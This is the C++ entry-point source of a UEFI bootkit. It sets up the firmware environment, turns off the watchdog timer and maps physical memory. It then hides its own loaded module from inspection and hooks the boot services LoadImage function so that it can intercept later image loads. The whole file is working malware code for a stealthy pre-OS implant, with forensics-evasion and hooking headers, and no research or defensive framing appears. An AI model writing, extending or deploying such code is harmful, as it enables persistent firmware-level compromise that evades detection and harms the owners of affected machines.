#include <bootkit/binary/heuristic.hpp>
#include <bootkit/binary/pe.hpp>
#include <bootkit/forensics/evasion.hpp>
#include <bootkit/general.hpp>
#include <bootkit/hooking/service_ptr.hpp>
#include <bootkit/hooking/shadow_table.hpp>
#include <bootkit/hooks/efi.hpp>
#include <bootkit/uefi_internals.hpp>

extern "C" {
#include <Library/BaseMemoryLib.h>
#include <Library/UefiLib.h>
#include <Protocol/LoadedImage.h>
}

static void setup_bootkit_env(EFI_HANDLE image_handle, EFI_SYSTEM_TABLE *system_table)
{
  EFI_LOADED_IMAGE_PROTOCOL *image_protocol;
  UINTN size, mapkey, descriptor_size;
  EFI_STATUS status;
  UINT32 descriptor_version;

  g::image_handle = image_handle;
  g::st = system_table;
  g::rt = system_table->RuntimeServices;
  g::bs = system_table->BootServices;

  // disable system hang detection (reboots if it takes too long)
  g::bs->SetWatchdogTimer(0, 0, 0, nullptr);
  status = g::bs->HandleProtocol(image_handle, &guid::loaded_image_protocol,
                                 reinterpret_cast<void **>(&image_protocol));
  if (EFI_ERROR(status)) {
    dbg::print(DEBUG_ERROR, "Failed to locate this driver's image protocol\r\n");
    return;
  }
  
  g::driver_pa = reinterpret_cast<EFI_PHYSICAL_ADDRESS>(image_protocol->ImageBase);
  g::driver_len = image_protocol->ImageSize;
  size = 0;
  mapkey = 0;
  descriptor_size = 0;
  descriptor_version = 0;
  status = g::bs->GetMemoryMap(&size, nullptr, &mapkey, &descriptor_size, &descriptor_version);
  if (status == EFI_BUFFER_TOO_SMALL) {
    EFI_PHYSICAL_ADDRESS maps;
    size += 8 * descriptor_size;
    status =
        g::bs->AllocatePages(AllocateAnyPages, EfiBootServicesData, EFI_SIZE_TO_PAGES(size), &maps);
    if (EFI_ERROR(status)) {
      dbg::print(DEBUG_ERROR, "Failed to allocate %u pages\r\n", EFI_SIZE_TO_PAGES(size));
      return;
    }

    g::uefi_phys_maps = reinterpret_cast<EFI_MEMORY_DESCRIPTOR *>(maps);
    status = g::bs->GetMemoryMap(&size, g::uefi_phys_maps, &mapkey, &descriptor_size,
                                 &descriptor_version);
    if (EFI_ERROR(status)) {
      dbg::print(DEBUG_ERROR, "Failed to query memory maps (%r)\r\n", status);
      return;
    }

    g::descriptor_size = descriptor_size;
    g::phys_map_count = size / descriptor_size;
  }
}

EFI_STATUS EFIAPI uefi_main(EFI_HANDLE image_handle, EFI_SYSTEM_TABLE *system_table)
{
  setup_bootkit_env(image_handle, system_table);
  
  dbg::print(DEBUG_INFO, "Hiding module\r\n");
  if (!hide_module(image_handle)) {
    dbg::print(DEBUG_ERROR, "Failed to hide module\r\n");
  }

  hooks::efi::original_LoadImage =
      swap_service_ptr(&g::bs->Hdr, &g::bs->LoadImage, hooks::efi::LoadImage);

  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI uefi_exit(EFI_HANDLE image_handle)
{
  return EFI_SUCCESS;
}